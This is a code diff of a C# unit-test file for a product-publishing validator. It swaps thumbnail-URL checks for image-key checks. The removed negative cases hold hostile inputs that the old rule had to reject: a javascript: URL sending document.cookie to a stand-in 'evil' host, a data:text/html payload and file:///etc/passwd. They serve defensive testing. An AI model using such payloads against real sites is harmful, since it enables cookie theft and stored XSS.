@@ -1,4 +1,5 @@
 using Catalog.Application.Products.PublishProduct;
+using Common.Application;
 using FluentValidation.Results;
 using Shouldly;
 using Xunit;
@@ -10,7 +11,10 @@ public class PublishProductValidatorTests
     private static readonly PublishProductValidator Validator = new();
 
     private static PublishProductCommand Valid() =>
-        new(Guid.CreateVersion7(), "Walnut desk", "https://cdn.example/desk.jpg", 19.99m, "EUR");
+        new(Guid.CreateVersion7(), "Walnut desk", ProductImageKey(), 19.99m, "EUR");
+
+    private static string ProductImageKey() =>
+        ProductImageKeys.UploadKey(Guid.CreateVersion7(), Guid.CreateVersion7(), "jpg");
 
     [Fact]
     public void A_valid_command_passes()
@@ -19,20 +23,19 @@ public class PublishProductValidatorTests
     }
 
     [Fact]
-    public void A_missing_thumbnail_is_valid()
+    public void A_missing_image_key_is_valid()
     {
-        Validator.Validate(Valid() with { ThumbnailUrl = null }).IsValid.ShouldBeTrue();
+        Validator.Validate(Valid() with { ImageKey = null }).IsValid.ShouldBeTrue();
     }
 
-    [Theory]
-    [InlineData("https://cdn.example/desk.jpg")]
-    [InlineData("HTTPS://CDN.EXAMPLE/desk.jpg")]
-    [InlineData("https://cdn.example/desk.jpg?v=2&size=large")]
-    public void An_https_thumbnail_is_valid(string url)
+    [Fact]
+    public void The_longest_key_is_valid()
     {
-        // The positive half, since a rule refusing every URL passes every case in Invalid(). The upper-case
-        // scheme is here because Uri.Scheme normalises to lower case.
-        Validator.Validate(Valid() with { ThumbnailUrl = url }).IsValid.ShouldBeTrue(url);
+        // The positive half of the bound, since a rule refusing every key passes every case in Invalid().
+        string longest = ProductImageKeys.ProductKey(Guid.CreateVersion7(), Guid.CreateVersion7(), "webp");
+
+        longest.Length.ShouldBe(ProductImageKeys.LongestDestinationKeyLength);
+        Validator.Validate(Valid() with { ImageKey = longest }).IsValid.ShouldBeTrue();
     }
 
     /// <summary>The positive half of the name rule: a pair is one character, and a script is not a control.</summary>
@@ -102,25 +105,13 @@ public class PublishProductValidatorTests
         { nameof(PublishProductCommand.CommandId), Valid() with { CommandId = Guid.Empty } },
         { nameof(PublishProductCommand.Name), Valid() with { Name = "" } },
         { nameof(PublishProductCommand.Name), Valid() with { Name = new string('x', 201) } },
-        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = new string('x', 401) } },
-        // Served to every reader of the catalogue (§6.5), and a javascript: or data:text/html URL bound into an
-        // href is stored XSS.
+        // A key and never a URL (§10.8): past the longest key the BFF mints is not one it minted, and the rule is
+        // what stops a URL of any scheme being sent in its place.
         {
-            nameof(PublishProductCommand.ThumbnailUrl),
-            Valid() with { ThumbnailUrl = "javascript:fetch('//evil/'+document.cookie)" }
+            nameof(PublishProductCommand.ImageKey),
+            Valid() with { ImageKey = new string('x', ProductImageKeys.LongestDestinationKeyLength + 1) }
         },
-        {
-            nameof(PublishProductCommand.ThumbnailUrl),
-            Valid() with { ThumbnailUrl = "data:text/html;base64,PHNjcmlwdD4=" }
-        },
-        // A scheme with no use here; the rule is an allow-list of one, https, rather than a deny-list.
-        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "file:///etc/passwd" } },
-        // Mixed content on the buyer's https page, and readable on the wire (ADR-085).
-        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "http://cdn.example/desk.jpg" } },
-        // Relative: no scheme to refuse, and nothing here serves an origin the
-        // catalogue's images would be relative to.
-        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "/images/desk.jpg" } },
-        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "not a url at all" } },
+        { nameof(PublishProductCommand.ImageKey), Valid() with { ImageKey = "" } },
         { nameof(PublishProductCommand.Amount), Valid() with { Amount = -0.01m } },
         // decimal(19,4)'s integer capacity — past it the write fails at
         // SaveChanges as a 500, which is the wrong blame for bad input.
